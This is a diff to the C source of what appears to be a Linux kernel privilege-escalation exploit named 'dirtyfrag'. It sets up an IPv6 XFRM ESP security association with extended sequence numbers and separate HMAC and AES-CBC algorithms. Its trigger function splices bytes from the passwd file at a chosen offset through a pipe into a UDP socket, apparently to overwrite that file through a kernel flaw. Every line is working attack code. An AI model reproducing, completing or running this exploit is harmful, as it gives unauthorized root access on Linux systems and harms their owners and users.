@@ -139,24 +139,41 @@ static bool xfrm6_register_sa(int nl, const unsigned char seq_hi[4])
     usa->reqid     = 0x1234;
     usa->family    = AF_INET6;            /* <-- v6 */
     usa->mode      = XFRM_MODE_TRANSPORT;
-    usa->replay_window = 32;
+    usa->replay_window = 0;       /* SA-level: 0; ESN-level (below): 32 */
     usa->flags     = XFRM_STATE_ESN;
 
     size_t hdrlen = sizeof(*nlh) + sizeof(*usa);
     size_t attrs  = 0;
     char *abuf = buf + hdrlen;
 
-    {  /* XFRMA_ALG_AEAD */
-        struct xfrm_algo_aead *aead;
-        unsigned short dlen = sizeof(*aead) + 32;
+    /*
+     * Same authencesn-as-composition story as the v4 path — see the
+     * comment block in dirtyfrag_esp.c::xfrm_register_sa for why we
+     * register two separate attributes instead of XFRMA_ALG_AEAD.
+     */
+    {  /* XFRMA_ALG_AUTH_TRUNC */
+        struct xfrm_algo_auth *aa;
+        unsigned short dlen = sizeof(*aa) + 32;
         struct rtattr *r = (struct rtattr *)(abuf + attrs);
-        r->rta_type = XFRMA_ALG_AEAD;
+        r->rta_type = XFRMA_ALG_AUTH_TRUNC;
         r->rta_len  = RTA_LENGTH(dlen);
-        aead = (struct xfrm_algo_aead *)RTA_DATA(r);
-        memset(aead, 0, dlen);
-        strncpy(aead->alg_name, ALG_NAME, sizeof(aead->alg_name) - 1);
-        aead->alg_key_len = 32 * 8;
-        aead->alg_icv_len = 128;
+        aa = (struct xfrm_algo_auth *)RTA_DATA(r);
+        memset(aa, 0, dlen);
+        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
+        aa->alg_key_len   = 32 * 8;
+        aa->alg_trunc_len = 128;
+        attrs += RTA_SPACE(dlen);
+    }
+    {  /* XFRMA_ALG_CRYPT */
+        struct xfrm_algo *ea;
+        unsigned short dlen = sizeof(*ea) + 16;
+        struct rtattr *r = (struct rtattr *)(abuf + attrs);
+        r->rta_type = XFRMA_ALG_CRYPT;
+        r->rta_len  = RTA_LENGTH(dlen);
+        ea = (struct xfrm_algo *)RTA_DATA(r);
+        memset(ea, 0, dlen);
+        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
+        ea->alg_key_len = 16 * 8;
         attrs += RTA_SPACE(dlen);
     }
     {  /* XFRMA_REPLAY_ESN_VAL — same primitive input as v4 */
@@ -279,7 +296,7 @@ static bool trigger_store_v6(off_t passwd_off)
     }
     {
         loff_t off = passwd_off;
-        if (splice(pfd, &off, p[1], NULL, 16, 0) != 16) {
+        if (splice(pfd, &off, p[1], NULL, 16, SPLICE_F_MOVE) != 16) {
             log_bad("splice passwd: %s", strerror(errno));
             goto fail;
         }
@@ -292,12 +309,16 @@ static bool trigger_store_v6(off_t passwd_off)
         }
     }
     if (splice(p[0], NULL, udp_send, NULL,
-               24 + 16 + V6_PAD_BYTES, 0) != 24 + 16 + V6_PAD_BYTES) {
+               24 + 16 + V6_PAD_BYTES, SPLICE_F_MOVE)
+            != 24 + 16 + V6_PAD_BYTES) {
         log_bad("splice pipe->udp v6: %s", strerror(errno));
         goto fail;
     }
     close(p[0]); close(p[1]);
 
+    /* See the comment in dirtyfrag_esp.c::trigger_store on why we
+     * need to wait before tearing down sockets. */
+    usleep(150 * 1000);
     unsigned char drain[256];
     (void)recv(udp_recv, drain, sizeof(drain), MSG_DONTWAIT);
 
